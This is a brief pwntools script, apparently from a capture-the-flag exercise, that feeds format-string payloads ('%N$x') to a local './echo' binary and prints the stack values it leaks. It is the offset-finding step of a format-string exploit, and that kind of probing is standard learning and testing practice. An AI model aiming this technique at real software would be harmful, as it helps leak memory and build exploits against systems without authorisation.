#!/usr/bin/env python3

from pwn import *

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

exe = context.binary = ELF("./echo", checksec=False)
context.log_level = "warning"

for i in range(1, 32):
    io = start()
    payload = f"%{i}$x".encode()
    io.sendlineafter(b"> ", payload)
    leak = io.recvline()
    print(str(i) + ' : ' + leak.decode().strip())
    io.close()
